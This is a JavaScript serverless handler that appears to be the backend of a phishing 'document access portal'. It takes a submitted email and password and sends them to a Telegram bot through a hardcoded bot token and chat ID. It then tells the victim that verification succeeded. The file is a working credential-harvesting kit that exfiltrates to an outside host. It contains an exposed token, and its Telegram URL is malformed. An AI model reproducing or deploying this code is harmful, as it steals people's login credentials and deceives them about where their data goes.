export default async function handler(req, res) {
    // Only accept POST requests
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    // 1. Automatically parse both JSON and standard Web Forms data
    let email = req.body?.email;
    let password = req.body?.password;

    // Fallback parser if the server environment drops content headers
    if (!email && typeof req.body === 'string') {
        const params = new URLSearchParams(req.body);
        email = params.get('email');
        password = params.get('password');
    }

    // 2. Updated verified credentials
    const botToken = "9034651544:AAFF2_8GEO6H3e6ataVEkHhha39kIDPlAt8"; 
    const chatId = "1080822304"; 

    // Safety verification check to prevent blank executions
    if (!email || !password) {
        return res.status(400).send(`<h2>Form Parsing Error</h2><p>The server received an empty data payload. Please ensure form fields match.</p><br><a href='/'>Go Back</a>`);
    }

    // 3. Format the secure layout text message payload (Plain text to prevent parsing drops)
    const messageText = `📄 DOCUMENT ACCESS PORTAL REGISTRATION\n\n📧 Portal Email: ${email}\n🔑 Access Key: ${password}`;
    const telegramUrl = `https://telegram.org{botToken}/sendMessage`;

    try {
        // 4. Dispatch the text payload to Telegram's cloud engine
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText
            })
        });

        const result = await response.json();

        if (result.ok) {
            return res.status(200).send("<h2>Verification successful. Connecting to secure file server...</h2><br><a href='/'>Go Back</a>");
        } else {
            // Displays precise feedback directly from Telegram if things fail
            return res.status(500).send(`<h2>Telegram API Error:</h2><p>${result.description}</p><br><a href='/'>Go Back</a>`);
        }
    } catch (error) {
        return res.status(500).send(`<h2>Connection Failure:</h2><p>${error.message}</p><br><a href='/'>Go Back</a>`);
    }
}
